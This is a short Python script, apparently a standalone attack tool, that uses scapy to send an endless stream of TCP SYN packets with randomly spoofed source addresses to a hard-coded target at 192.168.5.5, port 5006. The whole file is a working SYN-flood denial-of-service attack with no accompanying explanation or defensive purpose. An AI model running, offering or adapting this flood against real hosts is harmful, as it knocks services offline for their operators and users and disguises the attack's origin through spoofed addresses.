from scapy.all import RandIP, IP, TCP, send


class Flood:
    def __init__(self, target_address, sport, dport):
        self.target_address = target_address
        self.sport = sport
        self.dport = dport

    def send_flood(self):
        while True:
            send_address = RandIP()
            package = IP(
                src=send_address,
                dst=self.target_address) / TCP(
                    sport=self.sport,
                    dport=self.dport,
                    seq=1505066,
                    flags='S')

            send(package)


if __name__ == '__main__':
    spammer = Flood('192.168.5.5', 1234, 5006)
    spammer.send_flood()
